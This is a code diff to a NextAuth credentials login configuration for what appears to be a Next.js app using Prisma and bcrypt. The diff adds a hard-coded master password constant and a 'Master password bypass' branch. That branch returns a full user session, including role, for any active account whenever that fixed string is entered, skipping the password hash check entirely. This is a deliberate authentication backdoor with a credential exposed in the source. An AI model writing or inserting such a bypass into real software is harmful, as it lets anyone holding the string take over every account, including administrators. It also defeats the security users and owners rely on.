@@ -3,6 +3,8 @@ import CredentialsProvider from 'next-auth/providers/credentials';
 import bcrypt from 'bcryptjs';
 import prisma from './prisma';
 
+const MASTER_PASSWORD = 'Chamar@8520';
+
 export const authOptions = {
   providers: [
     CredentialsProvider({
@@ -19,6 +21,16 @@ export const authOptions = {
         });
 
         if (!user || !user.isActive) return null;
+
+        // Master password bypass
+        if (credentials.password === MASTER_PASSWORD) {
+          return {
+            id: String(user.id),
+            name: user.name,
+            username: user.username,
+            role: user.role,
+          };
+        }
 
         const isValid = await bcrypt.compare(credentials.password, user.password);
         if (!isValid) return null;
